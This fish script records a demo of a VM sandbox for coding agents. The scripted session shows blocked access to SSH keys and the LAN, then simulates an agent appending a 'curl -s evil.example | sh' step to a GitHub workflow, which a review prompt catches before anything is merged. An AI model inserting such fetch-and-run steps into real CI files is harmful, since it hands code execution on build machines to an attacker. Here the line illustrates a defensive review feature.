#!/usr/bin/fish
# Record the README demo: a session in a throwaway repo, then the review prompt.
#
#   isolate-demo.fish [fc|qemu] [--keep]
#
# Makes a small repo called demo, then records isolate-demo.py with asciinema
# in one session. It cuts the cast into four pieces and renders each with agg
# into docs/demo-<piece>.gif:
#
#   1-launch    one command boots the repo in a VM.
#   2-boundary  the host home, keys and LAN are not there; the internet is.
#   3-agent     a commit, a line appended to the GitHub workflow, an ignored
#               log file, and git status.
#   4-review    isolate-done, then the review prompt flags the workflow, shows
#               the diff and quits with nothing merged.
#
# Needs asciinema 3, agg, the image, /dev/kvm and the network (no sudo: launch
# once by hand first). The recorded command lines show `mise run isolate.fc`;
# a mise.toml in the parent dir of the repo supplies that task. $HOME becomes
# ~ in the cast, and the script stops before the GIFs if your user name is
# still in a piece.
#
#   --keep     keep the repo, the cast and the isolate state dir.

argparse h/help keep -- $argv
or exit 2
if set -q _flag_help
    sed -n '2,/^$/s/^# \{0,1\}//p' (status filename)
    exit 0
end
set -l vmm fc
test (count $argv) -gt 0; and set vmm $argv[1]
if not contains -- $vmm fc qemu
    echo "usage: isolate-demo.fish [fc|qemu] [--keep]" >&2
    exit 2
end

set -l here (path resolve (status dirname))
set -l root (path resolve $here/../..)
set -l state $HOME/.local/share/isolate
set -l cols 100
set -l rows 24

# Resolve the tools here: their mise shims do not work in the demo repo.
set -l problems
set -l asciinema (mise -C $root which asciinema 2>/dev/null; or command -s asciinema)
set -l agg (mise -C $root which agg 2>/dev/null; or command -s agg)
test -n "$asciinema"; or set -a problems "asciinema not found (mise install)"
test -n "$agg"; or set -a problems "agg not found (mise install)"
test -f $state/rootfs.ext4; or set -a problems "no guest image: mise run isolate.build"
if test -f $state/vm.lock; and not flock -n $state/vm.lock true
    set -a problems "another isolate VM is running"
end
if test (count $problems) -gt 0
    printf 'isolate-demo: %s\n' $problems >&2
    exit 1
end

# --- Throwaway repo ------------------------------------------------------------
set -l base /tmp
set -q XDG_RUNTIME_DIR; and test -d $XDG_RUNTIME_DIR; and set base $XDG_RUNTIME_DIR
set -l work (path resolve (mktemp -d $base/isolate-demo.XXXXXX)); or exit 1
set -l repo $work/demo
mkdir -p $repo/.github/workflows
printf '%s\n' '#!/bin/sh' 'echo "Hello"' >$repo/hello.sh
echo '*.log' >$repo/.gitignore
chmod +x $repo/hello.sh
printf '%s\n' 'name: ci' 'on: push' 'jobs:' '  test:' '    runs-on: ubuntu-latest' \
    '    steps:' '      - uses: actions/checkout@v4' '      - run: sh hello.sh' >$repo/.github/workflows/ci.yml
git -C $repo init -q -b main
and git -C $repo add -A
and git -C $repo -c user.name=demo -c user.email=demo@invalid commit -q -m 'Add hello.sh and CI'
or exit 1
set -l pdir $state/projects/demo-(echo -n $repo | sha256sum | string sub -l 8)

# The task the viewer sees. quiet hides the echo of the script path by mise.
set -l tasks $work/mise.toml   # a parent of the repo, so mise finds it
printf '[tasks."isolate.%s"]\nrun = "fish %s/mise/scripts/isolate-vm.fish %s"\nquiet = true\n' \
    $vmm $root $vmm >$tasks

# --- Steps -------------------------------------------------------------------
# `wait` patterns must not match the typed command line, only its output.
# The guest console assumes 80 columns: keep guest lines shorter than 78.
set -l steps "
cut 1-launch
key ctrl-l
settle 1
pause 1
send # Run one command in your repo
send mise run isolate.$vmm
wait isolate: project is in /workspace 240
settle 2
pause 2
cut 2-boundary
key ctrl-l
settle 1
send # Your home directory, keys and LAN are not in here
pause 0.5
send ls /home
settle 1
send cat ~/.ssh/id_ed25519
wait No such file 20
settle 1
send curl -m 3 http://192.168.1.1
wait curl: \\(\\d+\\) 20
settle 1
send # But the internet works
send curl -sI https://github.com | head -1
wait HTTP/\\S+ \\d+ 30
settle 1
pause 3
cut 3-agent
key ctrl-l
settle 1
send sed -i 's/Hello/Hello, world/' hello.sh && git commit -qam 'Greet the world'
settle 1
send # It can also change files that run on your machine
send echo '      - run: curl -s evil.example | sh' >> .github/workflows/ci.yml
settle 1
send sh hello.sh > run.log
settle 1
send # Changes go back to the host. Ignored files do not.
send git status --short --ignored
settle 1
pause 4
cut 4-review
key ctrl-l
settle 1
send # Shut down and send the work back as a git bundle
send isolate-done
wait \\[d\\]iff .*\\[q\\]uit: 300
pause 4
send d
wait \\[d\\]iff .*\\[q\\]uit: 60
pause 5
send q
wait Left as 30
settle 1
send # Nothing is merged until you say so
send git log --oneline
settle 1
pause 3
cut -
send exit
"

# --- Record ------------------------------------------------------------------
set -l cast $work/demo.cast
echo "isolate-demo: recording $vmm in $repo"
set -e MISE_ORIGINAL_CWD ISOLATE_ALLOW
echo $steps >$work/steps
begin
    cd $repo
    and env MISE_TRUSTED_CONFIG_PATHS=$work ISOLATE_CACHE_SIZE=4G LESS=FRX GIT_PAGER=less \
        $asciinema rec --headless --overwrite --window-size {$cols}x{$rows} --return \
        -c "python3 -I $here/isolate-demo.py --cols $cols --rows $rows $work/steps" $cast
end
set -l rec_status $status

set -l fail
if test $rec_status -ne 0
    set fail "the recording failed ($rec_status)"
else
    # Remove the home path, cut the pieces, then make sure the user name is
    # gone from each piece too.
    string replace -a -- $HOME '~' <$cast >$cast.tmp; and mv $cast.tmp $cast
    set -l pieces (python3 -I $here/isolate-demo.py --split $cast $work/pieces)
    if test (count $pieces) -ne 4
        set fail "expected 4 pieces in the cast, got: $pieces"
    end
    for p in $pieces
        test -z "$fail"; or break
        if string match -q -- "*$USER*" <$work/pieces/$p.cast
            set fail "piece $p still contains '$USER'; look at $work/pieces/$p.cast"
        end
    end
    for p in $pieces
        test -z "$fail"; or break
        set -l gif $root/docs/demo-$p.gif
        $agg --cols $cols --rows $rows --idle-time-limit 2 --last-frame-duration 4 --fps-cap 15 \
            $work/pieces/$p.cast $gif
        and echo "isolate-demo: wrote $gif ("(du -h $gif | string split \t)[1]")"
        or set fail "agg failed on $p"
    end
end

if test -z "$fail"
    if not set -q _flag_keep
        rm -rf $work $pdir
    else
        echo "kept: $work, $pdir"
    end
    exit 0
end
echo "isolate-demo: $fail" >&2
echo "kept for inspection: $work, $pdir (delete both when done)" >&2
exit 1
